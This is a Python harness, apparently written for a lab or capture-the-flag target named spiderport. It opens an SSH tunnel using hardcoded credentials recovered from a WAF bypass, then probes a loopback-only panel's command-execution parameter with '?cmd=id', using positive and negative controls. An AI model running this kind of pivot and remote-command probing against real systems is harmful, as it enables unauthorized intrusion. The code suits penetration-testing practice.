#!/usr/bin/env python3
"""
SSH local-forward harness for lab 169 (spiderport).

Purpose: reach the loopback-only vhost 127.0.0.1:8080 through an SSH tunnel
opened with the credentials recovered from the WAF bypass.

Discipline implemented here:
  * The tunnel is part of the surface. Every HTTP request made through it is
    counted and reported, so the reader can see the work count that backs any
    claim about the 8080 service.
  * A POSITIVE CONTROL is forced through the tunnel before any negative claim
    about 8080 is believed.
  * Negative controls are also sent, so a tunnel that returns a constant
    (e.g. a captive local page) is detected rather than trusted.
"""
import socket, sys, threading, time, urllib.request, urllib.error

import paramiko

HOST, USER, PW = "172.17.0.8", "peter", "sp1der"
LOCAL_PORT = 18080
REMOTE = ("127.0.0.1", 8080)

requests_made = []
lock = threading.Lock()


def pump(src, dst):
    try:
        while True:
            data = src.recv(65536)
            if not data:
                break
            dst.sendall(data)
    except Exception:
        pass
    finally:
        for s in (src, dst):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            s.close()


def open_tunnel():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, username=USER, password=PW, timeout=15)
    t = c.get_transport()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", LOCAL_PORT))
    srv.listen(16)

    def on_conn(conn, addr):
        chan = t.open_channel("direct-tcpip", REMOTE, addr)
        threading.Thread(target=pump, args=(conn, chan), daemon=True).start()
        threading.Thread(target=pump, args=(chan, conn), daemon=True).start()

    return c, t, srv, on_conn


def serve_loop(srv, on_conn):
    while True:
        try:
            conn, addr = srv.accept()
        except socket.timeout:
            continue
        threading.Thread(target=on_conn, args=(conn, addr), daemon=True).start()


def fetch(path, note):
    url = f"http://127.0.0.1:{LOCAL_PORT}{path}"
    label = note or path
    try:
        r = urllib.request.urlopen(url, timeout=15)
        body = r.read().decode(errors="replace")
        rec = {"label": label, "path": path, "status": r.status,
               "bytes": len(body), "body": body}
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        rec = {"label": label, "path": path, "status": e.code,
               "bytes": len(body), "body": body}
    except Exception as e:
        rec = {"label": label, "path": path, "status": 0, "bytes": 0,
               "body": f"TRANSPORT ERROR: {type(e).__name__}: {e}"}
    with lock:
        requests_made.append(rec)
    return rec


def main():
    client, transport, srv, on_conn = open_tunnel()
    threading.Thread(target=serve_loop, args=(srv, on_conn), daemon=True).start()
    time.sleep(0.5)

    print(f"# tunnel up: 127.0.0.1:{LOCAL_PORT} -> {HOST}:{REMOTE[0]}:{REMOTE[1]} "
          f"(ssh {USER}@target -L)")

    # ---- CONTROL 1: the index must exist and be the internal panel.
    c1 = fetch("/", "CONTROL-1 positive: index.php must render internal panel")
    ok1 = ("Panel Interno" in c1["body"]) or ("cmd" in c1["body"])
    print(f"# CONTROL-1  status={c1['status']} bytes={c1['bytes']} "
          f"internal_panel_marker={ok1}")

    # ---- CONTROL 2: a command execution oracle must FIRE on a benign command.
    c2 = fetch("/?cmd=id", "CONTROL-2 positive: cmd=id must execute")
    ok2 = "uid=" in c2["body"]
    print(f"# CONTROL-2  status={c2['status']} bytes={c2['bytes']} "
          f"executes={ok2}")

    # ---- CONTROL 3: a negative control — a nonsense param must NOT execute.
    c3 = fetch("/?nosuchparam=zzz", "CONTROL-3 negative: no cmd param, no exec")
    ok3 = "uid=" not in c3["body"]
    print(f"# CONTROL-3  status={c3['status']} bytes={c3['bytes']} "
          f"did_not_execute={ok3}")

    print(f"# ORACLE GREEN IN BOTH DIRECTIONS: {ok1 and ok2 and ok3}")
    if not (ok1 and ok2 and ok3):
        print("# ABORT: refusing to trust any 8080 claim, oracle failed.")

    print(f"# WORK COUNT: requests through this tunnel = {len(requests_made)}")
    for r in requests_made:
        print(f"#   {r['label']} -> status={r['status']} bytes={r['bytes']}")

    with open("tunnel_evidence.txt", "w") as fh:
        fh.write("SSH TUNNEL EVIDENCE — lab 169 spiderport\n")
        fh.write(f"tunnel: 127.0.0.1:{LOCAL_PORT} -> {HOST}:{REMOTE[0]}:{REMOTE[1]}\n")
        fh.write(f"identity: ssh {USER}@{HOST}\n")
        fh.write(f"requests through tunnel: {len(requests_made)}\n\n")
        for r in requests_made:
            fh.write(f"===== {r['label']} | {r['path']} | "
                     f"status={r['status']} bytes={r['bytes']} =====\n")
            fh.write(r["body"][:4000] + "\n\n")

    srv.close()
    client.close()


if __name__ == "__main__":
    main()